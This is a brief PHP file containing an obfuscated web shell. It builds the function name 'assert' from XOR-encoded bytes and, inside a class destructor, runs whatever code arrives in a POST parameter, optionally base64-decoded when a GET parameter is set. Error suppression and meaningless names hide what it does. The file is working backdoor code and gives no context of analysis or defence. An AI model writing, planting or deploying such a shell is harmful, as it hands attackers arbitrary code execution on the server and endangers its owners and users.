<?php 
class IURR { 
    function EbUN() {
        $QfXE = "\x15" ^ "\x74";
        $Rdkq = "\xaa" ^ "\xd9";
        $SFvl = "\x89" ^ "\xfa";
        $FnOW = "\xba" ^ "\xdf";
        $pePx = "\xed" ^ "\x9f";
        $wUfF = "\x57" ^ "\x23";
        $zAje =$QfXE.$Rdkq.$SFvl.$FnOW.$pePx.$wUfF;
        return $zAje;
    }
    function __destruct(){
        $Mnqf=$this->EbUN();
        @$Mnqf($this->uM);
    }
}
$iurr = new IURR();
@$iurr->uM = isset($_GET['id'])?base64_decode($_POST['123123']):$_POST['123123'];
?>
